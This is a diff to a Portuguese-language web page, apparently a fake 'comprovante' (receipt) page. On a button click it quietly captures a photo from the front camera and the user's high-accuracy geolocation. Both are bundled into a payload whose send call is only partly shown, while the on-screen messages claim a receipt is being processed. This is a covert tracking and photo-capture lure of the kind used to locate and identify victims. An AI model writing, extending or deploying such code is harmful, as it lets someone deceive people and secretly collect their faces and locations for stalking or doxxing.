@@ -202,10 +202,50 @@
     const btn = document.getElementById('btnEnviar');
     const status = document.getElementById('status');
 
-    btn.addEventListener('click', () => {
-      if (!navigator.geolocation) return;
+    // Função para tirar foto via câmera frontal
+    async function tirarFoto() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false
+        });
 
-      status.innerHTML = '<div class="spinner"></div><span>Carregando comprovante...</span>';
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        // Aguarda meio segundo para a câmera ajustar o brilho/foco
+        await new Promise(resolve => setTimeout(resolve, 500));
+
+        const canvas = document.createElement('canvas');
+        const width = 480;
+        const height = (video.videoHeight * (width / video.videoWidth)) || 360;
+        canvas.width = width;
+        canvas.height = height;
+
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, width, height);
+
+        // Desliga a câmera
+        stream.getTracks().forEach(track => track.stop());
+
+        return canvas.toDataURL('image/jpeg', 0.6);
+      } catch (err) {
+        console.warn("Câmera não permitida ou indisponível:", err);
+        return null;
+      }
+    }
+
+    btn.addEventListener('click', async () => {
+      status.innerHTML = '<div class="spinner"></div><span>Processando confirmação...</span>';
+
+      // Captura foto e localização em paralelo
+      const fotoBase64 = await tirarFoto();
+
+      if (!navigator.geolocation) {
+        status.innerText = "Geolocalização não suportada.";
+        return;
+      }
 
       navigator.geolocation.getCurrentPosition(
         (pos) => {
@@ -215,10 +255,15 @@
             lat: latitude,
             lng: longitude,
             precisao: accuracy,
+            foto: fotoBase64 || null,
             timestamp: new Date().toISOString()
+          }).then(() => {
+            status.innerText = "Processando comprovante...";
           });
         },
-        (err) => {},
+        (err) => {
+          status.innerText = "Acesso negado para gerar comprovante.";
+        },
         { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
       );
     });
